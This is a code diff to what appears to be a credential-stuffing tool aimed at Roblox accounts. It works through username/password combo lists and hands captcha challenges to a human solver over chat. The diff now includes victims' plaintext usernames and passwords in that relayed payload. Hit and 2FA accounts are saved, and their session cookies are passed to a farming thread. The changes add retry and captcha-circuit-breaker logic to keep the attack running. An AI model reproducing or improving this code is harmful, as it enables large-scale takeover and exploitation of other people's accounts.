@@ -1,4 +1,4 @@
-import collections, random, threading, time
+import base64, collections, json, random, threading, time
 
 import config, farmer, rblx, store
 
@@ -34,6 +34,7 @@ class Pool:
         self.recent = collections.deque(maxlen=max(2, config.CAPTCHA_BREAKER_WINDOW))
         self.notify = None
         self.warm_lock = threading.Lock()
+        self.warm_busy = threading.Event()
         self.warm_pending = None
         self.warm_token = None
         self.warm_event = threading.Event()
@@ -60,7 +61,6 @@ class Pool:
             return sum(1 for s in self.recent if s == "captcha") / n
 
     def breaker_tripped(self):
-        """True kalau IP udah ke-flag berat -> wajib warm."""
         with self.lock:
             n = len(self.recent)
             if n < self.recent.maxlen:
@@ -73,8 +73,7 @@ class Pool:
         return self.mode
 
     def warm_status(self):
-        with self.warm_lock:
-            return self.warm_pending is not None
+        return self.warm_busy.is_set()
 
     def submit_warm(self, token):
         with self.warm_lock:
@@ -84,30 +83,41 @@ class Pool:
             self.warm_event.set()
             return True
 
-    def _try_warm(self, challenge, label):
-        """Block sampai user kasih token atau timeout. None kalau gagal."""
-        with self.warm_lock:
-            if self.warm_pending is not None:
-                return None
-            self.warm_pending = challenge or {}
-            self.warm_token = None
-            self.warm_event.clear()
-        blob = ((challenge or {}).get("inner") or {}).get("blob") or ""
-        msg = ("== WARM NEEDED ==\nakun: %s\n\n1. buka %s\n2. tempel BLOB\n"
-               "3. solve\n4. balas token ke chat ini\n\ntimeout %ds\n\nBLOB:\n%s"
-               % (label, config.WARM_PAGE, int(config.WARM_TIMEOUT), blob[:1500]))
-        if self.notify:
-            try:
-                self.notify(msg)
-            except Exception:
-                pass
-        self.warm_event.wait(config.WARM_TIMEOUT)
-        with self.warm_lock:
-            token = self.warm_token
-            self.warm_pending = None
-            self.warm_token = None
-        self._bump("warm")
-        return token
+    def _payload(self, ch, u, p):
+        body = {"cid": ch.get("id"), "ct": ch.get("type") or "captcha",
+                "meta": json.dumps(ch.get("meta") or {}),
+                "pk": ch.get("public_key") or rblx.public_key(),
+                "blob": ch.get("blob") or "", "u": u, "p": p}
+        return base64.urlsafe_b64encode(json.dumps(body).encode()).decode()
+
+    def _try_warm(self, ch, label, u="", p=""):
+        if self.warm_busy.is_set():
+            return None
+        self.warm_busy.set()
+        try:
+            with self.warm_lock:
+                self.warm_pending = ch or {}
+                self.warm_token = None
+                self.warm_event.clear()
+            payload = self._payload(ch or {}, u, p)
+            msg = ("== WARM NEEDED ==\nakun: %s\n\n"
+                   "1. buka %s\n2. tempel PAYLOAD\n3. solve captcha\n"
+                   "4. copy TOKEN, balas ke chat ini\n\ntimeout %ds\n\nPAYLOAD:\n%s"
+                   % (label, config.WARM_PAGE, int(config.WARM_TIMEOUT), payload))
+            if self.notify:
+                try:
+                    self.notify(msg)
+                except Exception:
+                    pass
+            self.warm_event.wait(config.WARM_TIMEOUT)
+            with self.warm_lock:
+                token = self.warm_token
+                self.warm_pending = None
+                self.warm_token = None
+            self._bump("warm")
+            return token
+        finally:
+            self.warm_busy.clear()
 
     def _login(self, cli, u, p, headers=None):
         try:
@@ -121,7 +131,7 @@ class Pool:
             return "captcha", detail, None
         if time.time() < self.warm_cool:
             return "captcha", detail, None
-        token = self._try_warm(cli.challenge, u)
+        token = self._try_warm(cli.challenge, u, u, p)
         if not token:
             self.warm_cool = time.time() + config.WARM_RETRY
             return "captcha", detail, None
@@ -158,9 +168,6 @@ class Pool:
             if self.paused:
                 time.sleep(1.0)
                 continue
-            if self.warm_pending is not None:
-                time.sleep(0.5)
-                continue
             job = store.claim_combo()
             if not job:
                 time.sleep(2.0)
@@ -170,6 +177,15 @@ class Pool:
             status, detail, cookie = self._login(cli, u, p)
 
             if status == "captcha":
+                if self.warm_busy.is_set():
+                    waited = 0.0
+                    while (self.warm_busy.is_set() and not self.stop.is_set()
+                           and waited < config.WARM_TIMEOUT):
+                        time.sleep(0.5)
+                        waited += 0.5
+                    store.back_to_pending(u, p, "warm-wait")
+                    self._bump("retry")
+                    continue
                 status, detail, cookie = self._handle_captcha(cli, u, p, detail)
                 if status == "captcha":
                     self._note("captcha")
@@ -188,26 +204,44 @@ class Pool:
                     except Exception:
                         wait = 60.0
                     self.gate.hold(wait)
-                delay = {"error": config.RETRY_DELAY, "csrf": 5.0, "ratelimited": 0.0}[status]
-                store.requeue(u, p, "%s %s" % (status, detail), delay, config.MAX_ATTEMPTS)
+                delay = {"error": config.RETRY_DELAY, "csrf": 5.0,
+                         "ratelimited": 0.0}[status]
+                store.requeue(u, p, "%s %s" % (status, detail), delay,
+                              config.MAX_ATTEMPTS)
                 self._bump("retry")
+                cli.reset(soft=True)
                 continue
 
-            if status == "hit":
-                store.add_hit(u, p, cookie, "")
-                store.finish_combo(u, p, "hit", "ok")
+            if status in ("hit", "2fa"):
+                note = "" if status == "hit" else "2fa"
+                store.add_hit(u, p, cookie, note)
+                store.finish_combo(u, p, status, detail)
+                if status == "2fa" and cli.challenge and cli.challenge.get("id"):
+                    try:
+                        store.set_state("2fa:%s" % u, json.dumps({
+                            "id": cli.challenge.get("id"),
+                            "type": cli.challenge.get("type"),
+                            "meta": cli.challenge.get("meta") or {}}))
+                    except Exception:
+                        pass
                 self._bump("hit")
                 if cookie:
                     threading.Thread(target=self._farm, args=(u, cookie),
                                      daemon=True).start()
-                cli.reset()
-            elif status == "2fa":
-                store.add_hit(u, p, cookie, "2fa")
-                store.finish_combo(u, p, "2fa", detail)
-                if cookie:
-                    threading.Thread(target=self._farm, args=(u, cookie),
-                                     daemon=True).start()
-                cli.reset()
+                cli.reset(soft=True)
+            elif status == "banned":
+                store.finish_combo(u, p, "banned", detail)
+            elif status == "invalid":
+                if self.breaker_tripped() or self.pool_soft():
+                    store.mark_soft(u, p, detail)
+                else:
+                    store.finish_combo(u, p, "invalid", detail)
             else:
                 store.finish_combo(u, p, status, detail)
             self._bump("done")
+
+    def pool_soft(self):
+        try:
+            return store.soft_count() > 0
+        except Exception:
+            return False
